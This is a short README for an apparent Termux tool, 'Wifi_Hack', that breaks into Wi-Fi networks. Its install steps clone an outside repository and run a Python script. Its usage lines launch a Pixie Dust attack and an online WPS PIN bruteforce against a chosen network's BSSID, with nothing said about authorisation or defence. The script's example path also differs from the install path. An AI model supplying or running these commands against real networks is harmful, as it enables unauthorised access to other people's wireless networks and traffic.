## Wifi_Hack
### Hack WIfi Using Termux! (Requires Root)

<p align="center"><img src="https://i.ibb.co/K74g0SC/hulu.jpg"></p>

### Installation :

```bash
$ apt update && apt upgrade
$ pkg install -y root-repo
$ pkg install -y git tsu python wpa-supplicant pixiewps iw
$ git clone https://github.com/nayembai/Naiyem_WiFi_Hack
$ cd Naiyem_WiFi_Hack
$ chmod +x Muhammad_Naiyem.py
$ sudo python Muhammad_Naiyem.py --help
$ sudo python Muhammad_Naiyem.py -i wlan0 -K
```

#### Example : `sudo python Naiyem_WiFi_Hack/_Naiyem.py -i wlan0 -K`

#### Note: 
**First turn off your Wifi.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python Muhammad_Naiyem.py -i wlan0 -K`
- - Start Pixie Dust attack on a specified BSSID:
`sudo python Muhammad_Naiyem.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python Muhammad_Naiyem.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
### Troubleshooting
**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**
